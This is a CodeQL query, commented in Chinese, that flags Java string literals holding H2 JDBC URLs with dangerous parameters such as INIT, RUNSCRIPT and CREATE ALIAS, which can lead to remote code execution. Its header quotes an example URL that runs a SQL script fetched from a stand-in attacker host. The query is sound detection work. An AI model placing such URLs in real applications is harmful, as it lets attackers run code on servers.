/**
 * 检测 H2 JDBC URL 中的 INIT 脚本参数。
 *
 * H2 JDBC URL 支持 INIT=RUNSCRIPT FROM '...' 参数，可在连接时执行任意 SQL 或脚本。
 * 结合 CREATE ALIAS 可实现任意 Java 代码执行（RCE）。
 *
 * 示例危险 URL:
 *   jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'
 *   jdbc:h2:~/test;TRACE_LEVEL_SYSTEM_OUT=3
 */
import java

from StringLiteral s
where
  s.getLiteral().toLowerCase().matches("%jdbc:h2:%")
  and (
    s.getLiteral().toUpperCase().matches("%INIT=%")
    or s.getLiteral().toUpperCase().matches("%RUNSCRIPT%")
    or s.getLiteral().toUpperCase().matches("%TRACE_LEVEL%")
    or s.getLiteral().toUpperCase().matches("%CREATE ALIAS%")
  )
select
  s.getLocation().getFile().getRelativePath() as file,
  s.getLocation().getStartLine()              as line,
  s.getLiteral()                              as jdbc_url,
  "H2 JDBC URL 包含危险参数（INIT/RUNSCRIPT/CREATE ALIAS），可能导致 RCE" as message
